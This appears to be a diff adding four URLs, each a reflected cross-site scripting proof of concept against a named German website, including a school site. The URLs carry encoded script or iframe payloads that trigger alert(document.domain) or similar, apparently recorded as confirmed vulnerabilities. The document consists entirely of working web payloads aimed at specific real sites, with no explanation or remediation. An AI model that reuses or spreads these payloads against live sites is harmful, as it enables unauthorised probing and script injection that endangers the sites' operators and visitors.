@@ -1,0 +1,4 @@
+http://globaltherm.de/pages/includes/status-list-mo%3CIFRAME%20SRC%3D%22javascript%3Aalert%281337%29%22%3E.vm
+http://gofair.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://gw.padrogus.de/cs/idcplg?FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&IdcService=GET_SEARCH_RESULTS&PageName=indext&PageTitle=XXXXXXXXXXXX%3Cscript%3Ealert(31337)%3C%2Fscript%3E&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(-7)$%3E%60)&ResultCount=20&ResultTemplate=StandardResults&ResultsTitle=AAA&SortField=dInDate&SortOrder=Desc&dSecurityGroup
+https://gymnasium-ettenheim.de/index.php?id=1%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&r=students/guardians/create
